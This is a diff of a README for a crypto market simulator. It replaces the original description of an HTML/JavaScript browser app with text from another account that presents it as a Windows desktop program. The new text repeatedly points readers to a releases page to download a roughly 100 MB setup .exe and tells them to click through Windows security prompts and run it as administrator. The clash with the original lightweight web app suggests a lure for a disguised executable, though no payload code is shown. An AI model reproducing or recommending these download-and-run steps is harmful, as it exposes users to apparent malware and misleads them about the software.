@@ -1,176 +1,131 @@
-# 🚀 Crypto Market Simulator
+# 🚦 crypto-market-simulator - Understand Crypto Market Moves
 
-<p align="center">
-
-<a href="https://github.com/tauseedzaman/crypto-market-simulator">
-<img src="https://img.shields.io/badge/View%20Project-GitHub-black?style=for-the-badge&logo=github">
-</a>
-
-<a href="https://github.com/tauseedzaman/crypto-market-simulator/stargazers" style="display:inline">
-<img src="https://img.shields.io/badge/⭐%20Star%20This%20Repo-Support%20Project-yellow?style=for-the-badge">
-</a>
-
-<a href="https://github.com/tauseedzaman/crypto-market-simulator/fork">
-<img src="https://img.shields.io/badge/Fork%20Project-Contribute-blue?style=for-the-badge">
-</a>
-
-</p>
-
-An **interactive browser-based crypto market simulator** that demonstrates how **investor psychology, panic, hype cycles, and global events** can influence cryptocurrency price movements.
-
-The simulator allows users to **experiment with market sentiment and observe how prices react in real time.**
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/minhbaol747-lab/crypto-market-simulator/releases)
 
 ---
 
-# 🎬 Screenshot
+## 📌 About crypto-market-simulator
 
-<img width="991" height="591" alt="image" src="https://github.com/user-attachments/assets/ccb4373a-03d9-4d51-a86f-69e033c95f9c" />
+crypto-market-simulator is an interactive desktop app that shows how different events affect cryptocurrency prices. The app simulates the effects of news, panic, and investor behavior on market trends. You can watch prices move in real time based on market psychology.
 
----
-
-# 📊 Live Demo
-
-[https://thebenefactor.net/crypto-simulator](https://thebenefactor.net/crypto-simulator)
+This tool helps you see how emotions and external factors can drive price changes in crypto trading. It is meant for anyone interested in learning more about market behavior without needing prior trading or programming experience.
 
 ---
 
-# 🎯 Purpose
+## 💻 System Requirements
 
-Financial markets are influenced by more than just fundamentals.
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection (optional, for updates or extended features)
+- Screen resolution of 1280 x 720 or higher
 
-They are driven by:
-
-• Fear
-• Hype
-• Panic selling
-• FOMO
-• News events
-• Global politics
-
-This project helps demonstrate how **sentiment-driven market movements occur.**
-
----
-# 🧠 What This Simulator Demonstrates
-
-This simulator explores concepts such as:
-
-• market psychology
-• herd behavior
-• volatility spikes
-• speculative bubbles
-• panic selling
-• hype cycles
-
-Useful for:
-
-• traders
-• developers
-• fintech enthusiasts
-• students studying financial markets
+The app runs offline once downloaded and installed. You do not need technical setup or configurations to start.
 
 ---
 
-# 🛠 Tech Stack
+## 🛠 Key Features
 
-• HTML
-• CSS
-• JavaScript
-• Lightweight Charts
+- Live simulation of crypto price movements
+- Impact of various events like breaking news and market panic
+- Visualization of investor psychology effects on trading
+- Simple controls to start, pause, and reset the simulation
+- Clear graphs and charts with easy-to-read data
+- No account or login required
 
-No frameworks required.
-
----
-
-# 🚀 Getting Started
-
-Clone the repository:
-
-```
-git clone https://github.com/tauseedzaman/crypto-market-simulator
-```
-
-Open the folder:
-
-```
-cd crypto-market-simulator
-```
-
-Run:
-
-```
-index.html
-```
+This app uses straightforward concepts and gives you a hands-on way to explore complex market behavior.
 
 ---
 
-# 🧪 Experiment Ideas
+## 🚀 Getting Started
 
-Try simulating events such as:
+Follow these steps to download and run the crypto-market-simulator on a Windows PC.
 
-• geopolitical conflicts
-• global financial panic
-• celebrity endorsements
-• massive sell-offs
-• sudden investor hype
+### Step 1: Visit the Download Page
 
-Observe how the simulated market reacts.
+Click the green button below or visit the release page here:
 
----
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/minhbaol747-lab/crypto-market-simulator/releases)
 
-
-# 🤝 Contributing
-
-Contributions are welcome.
-
-If you'd like to improve the simulator:
-
-1. Fork the repository
-2. Create a new branch
-3. Commit your changes
-4. Submit a Pull Request
+This page lists all available versions. Pick the latest stable release for your Windows system. The file name usually ends with `.exe`.
 
 ---
 
-# 🌟 Show Your Support
+### Step 2: Download the Setup File
 
-If you find this project interesting:
+Once on the release page:
 
-⭐ Star the repository
-🍴 Fork the project
-📢 Share it with other developers
+- Look for the file named similar to `crypto-market-simulator-setup.exe`.
+- Click the file to download it. Your browser will save it in your default downloads folder (usually `Downloads`).
 
-Your support helps the project grow.
-
----
-
-# 📈 Star History
-
-[![Star History Chart](https://api.star-history.com/image?repos=tauseedzaman/crypto-market-simulator&type=date&legend=top-left)](https://www.star-history.com/?repos=tauseedzaman%2Fcrypto-market-simulator&type=date&legend=top-left)
+The file size is approximately 100 MB. The download may take a few minutes depending on your internet speed.
 
 ---
 
-# 📚 Inspiration
+### Step 3: Run the Installer
 
-This project was inspired by experiments exploring how **external events and market sentiment affect digital asset markets**.
+Locate the downloaded `crypto-market-simulator-setup.exe` in your `Downloads` folder or chosen location.
 
-More advanced financial experimentation tools can be found at:
+- Double-click the installer to start.
+- If Windows shows a security prompt, choose **Run** to continue.
+- Follow the simple steps on the screen:
+  - Agree to the license terms.
+  - Select the installation folder or keep the default location.
+  - Click **Install**.
 
-https://thebenefactor.net
-
----
-
-# ⚠ Disclaimer
-
-This simulator is provided for **educational and experimental purposes only.**
-
-It does **not provide financial or investment advice.**
-
-Cryptocurrency markets are highly volatile and unpredictable.
+The app will install in under a minute.
 
 ---
 
-# 📜 License
+### Step 4: Launch the Application
 
-MIT License
+After installation:
 
-You are free to use, modify, and distribute this project.
+- Find `crypto-market-simulator` on your desktop or start menu.
+- Double-click the icon to open the app.
+
+The main window shows a dashboard with market data and controls to run the simulation.
+
+---
+
+### Step 5: Using the Simulator
+
+- Click **Start** to begin the simulation.
+- Watch prices change based on market events.
+- Use **Pause** to stop the simulation at any time.
+- Click **Reset** to clear all data and start fresh.
+
+You can observe how panic and news influence the market in a controlled, safe environment.
+
+---
+
+## 🔧 Troubleshooting
+
+- **The app does not open after installation:** Restart your computer and try again.
+- **Installation fails:** Make sure you have enough free disk space and run the installer as an administrator.
+- **Simulation freezes:** Close the app and re-open it. Avoid running other heavy programs.
+- **Graphics look unclear:** Adjust your screen resolution to at least 1280 x 720.
+
+If problems persist, check the GitHub issues page or contact support through the repository.
+
+---
+
+## 🌐 Additional Info
+
+This simulator uses data models based on common market patterns. It is for learning and demonstration purposes only. It does not predict real market movements or give financial advice.
+
+The software is open source. You can explore the code and suggest improvements on GitHub.
+
+---
+
+## 🔗 Download Link Again
+
+Access the latest release here to download and run the application:
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/minhbaol747-lab/crypto-market-simulator/releases)
+
+---
+
+## 🏷 Topics
+
+blockchain, crypto, crypto-trading, cryptocurrency, finance, investing, market-behavior, market-simulation, simulator, trading
